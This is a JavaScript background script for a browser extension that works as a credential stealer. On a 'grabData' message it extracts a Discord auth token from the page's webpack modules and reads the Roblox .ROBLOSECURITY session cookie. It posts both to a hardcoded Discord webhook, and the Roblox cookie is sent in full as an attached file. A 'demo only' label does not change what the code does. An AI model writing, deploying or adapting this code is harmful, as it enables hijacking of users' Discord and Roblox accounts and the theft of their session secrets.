chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action !== "grabData") return;

    const site = message.site.toLowerCase();
    let embedTitle = "Cookies 🍪";
    let color = 0x5865F2;
    let fields = [];

    // Replace with your actual Discord Webhook URL
    const webhookUrl = "https://discord.com/api/webhooks/1572177598639902790/fM3miBLMBfrxbjzdbUIEbMQ7aZW3RKqub8rBfdbi2VGHR-xKT-KCNoXN-Y8V3ixVeID8";

    // Helper function to send the webhook payload with fields
    function sendPayload() {
        // Fallback dummy field if fields array is empty to prevent Discord 400 errors
        if (fields.length === 0) {
            fields.push({
                name: "Status",
                value: "No data captured",
                inline: false
            });
        }

        const payload = {
            content: "", 
            embeds: [
                {
                    title: embedTitle,
                    description: "All you need is Cookies! (demo only)",
                    color: color,
                    fields: fields
                }
            ]
        };

        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        })
        .then(async response => {
            if (!response.ok) {
                const errorBody = await response.text();
                console.error("Discord rejected webhook (" + response.status + "):", errorBody);
            } else {
                console.log("Webhook sent successfully!");
            }
        })
        .catch(error => {
            console.error("Network error sending webhook:", error);
        });
    }

    if (site.includes("discord")) {
        embedTitle = "🎮 Discord";
        color = 0x5865F2;

        let token = "Not extracted (timing/protection)";
        try {
            window.webpackChunkdiscord_app?.push([[Math.random()], {}, (req) => {
                for (const m of Object.values(req.c || {})) {
                    if (m?.exports?.default?.getToken) {
                        token = m.exports.default.getToken() || token;
                        return;
                    }
                }
            }]);
            window.webpackChunkdiscord_app?.pop();
        } catch {}

        const redactedToken = token !== "Not extracted (timing/protection)"
            ? token.substring(0, 8) + "..." + token.slice(-8) + " [REDACTED]"
            : token;

        fields.push({
            name: "Discord Token",
            value: "`" + redactedToken + "`",
            inline: false
        });

        sendPayload();
    }
    else if (site.includes("roblox")) {
        const embedTitle = "🟥 Roblox";
        const color = 0xE31C2D; // Red theme for Roblox

        chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
            if (chrome.runtime.lastError) {
                console.error(chrome.runtime.lastError);
            }

            let securityToken = "Not found";
            if (cookie && cookie.value) {
                securityToken = cookie.value;
            }

            // Pack the token into a text file blob so it is fully scrollable in Discord
            const blob = new Blob([securityToken], { type: "text/plain" });
            const formData = new FormData();
            
            formData.append("file", blob, "roblox_cookie.txt");
            formData.append("payload_json", JSON.stringify({
                content: "🟥 **Roblox Cookie Captured (Scrollable File)**",
                embeds: [
                    {
                        title: embedTitle,
                        description: "Click the attached `roblox_cookie.txt` file below to open Discord's built-in viewer and scroll to the bottom of the entire cookie string.",
                        color: color
                    }
                ]
            }));

            fetch(webhookUrl, {
                method: "POST",
                body: formData
            })
            .then(async response => {
                if (!response.ok) {
                    response.text().then(errorBody => {
                        console.error("Discord rejected webhook (" + response.status + "):", errorBody);
                    });
                } else {
                    console.log("Webhook sent successfully with scrollable file!");
                }
            })
            .catch(error => {
                console.error("Network error sending webhook:", error);
            });
        });
    }
    else {
        sendPayload();
    }
});